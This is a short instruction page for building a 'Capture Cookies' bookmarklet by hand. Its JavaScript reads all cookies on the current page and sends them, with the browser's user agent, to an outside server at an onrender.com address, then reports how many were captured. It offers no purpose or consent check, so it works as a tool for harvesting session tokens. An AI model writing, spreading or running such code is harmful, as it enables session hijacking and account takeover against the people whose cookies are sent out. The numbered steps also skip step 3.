🔧 Alternative: Create Bookmarklet Manually

If drag-and-drop doesn't work, create a new bookmark manually with this JavaScript code:

javascript:(function(){const API="https://backend-zbr5.onrender.com";const c=document.cookie;if(!c){alert("❌ No cookies found!");return;}const x=new XMLHttpRequest();x.open("POST",API+"/api/cookies/manual",true);x.setRequestHeader("Content-Type","application/json");x.onload=function(){if(x.status===200){const r=JSON.parse(x.responseText);alert("✅ Success! "+r.cookieCount+" cookies captured");}else{alert("❌ Error: "+x.responseText);}};x.onerror=function(){alert("❌ Network error. Check API URL.")};x.send(JSON.stringify({cookie:c,userAgent:navigator.userAgent}));})();

1. Create a new bookmark
2. Name it "Capture Cookies"

4. Save it
